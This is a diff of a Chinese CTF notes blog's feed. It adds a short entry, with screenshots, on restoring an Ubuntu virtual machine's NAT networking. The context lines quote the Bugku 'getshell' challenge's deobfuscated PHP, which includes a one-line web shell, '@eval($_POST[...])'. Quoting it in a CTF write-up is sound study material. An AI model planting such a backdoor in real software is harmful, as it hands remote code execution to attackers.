@@ -4549,6 +4549,23 @@ public function __toString()&#123;
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;加密方式：php源码混淆类加密。免费版地址:https:&#x2F;&#x2F;www.zhaoyuanma.com&#x2F;phpjm.html 免费版不能解密,可以使用VIP版本。</span><br><span class="line">&#x2F;&#x2F;此程序由【找源码】http:&#x2F;&#x2F;Www.ZhaoYuanMa.Com (免费版）在线逆向还原，QQ：7530782 </span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line">@eval($_POST[ymlisisisiook]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>题目地址：<a href="https://ctf.bugku.com/challenges/detail/id/107.html">getshell - Bugku CTF</a></p>
+<h3 id="关于虚拟机突然没有网络问题解决"><a href="#关于虚拟机突然没有网络问题解决" class="headerlink" title="关于虚拟机突然没有网络问题解决"></a>关于虚拟机突然没有网络问题解决</h3><p>之前应该是为了打AWD，把网络连接配置给重置了</p>
+<p>导致虚拟机那块的网络没有跟上，于是都没有网络 ==</p>
+<p>还好今天试了配置ubuntu的网络</p>
+<p>参考：<a href="https://blog.csdn.net/tiramisu_L/article/details/80398451">Ubuntu网络配置（NAT模式）_tiramisu_L的博客-CSDN博客</a></p>
+<p>最重要还是重置了虚拟机网络配置</p>
+<p>1.</p>
+<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145702228.png" alt="image-20211022145702228"></p>
+<p>2.</p>
+<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145736426.png" alt="image-20211022145736426"></p>
+<p>3.</p>
+<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145756792.png" alt="image-20211022145756792"></p>
+<p>4.</p>
+<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145813165.png" alt="image-20211022145813165"></p>
+<p>5.</p>
+<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145828373.png" alt="image-20211022145828373"></p>
+<p>6.</p>
+<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145852767.png" alt="image-20211022145852767"></p>
 ]]></content>
       <tags>
         <tag>博客</tag>
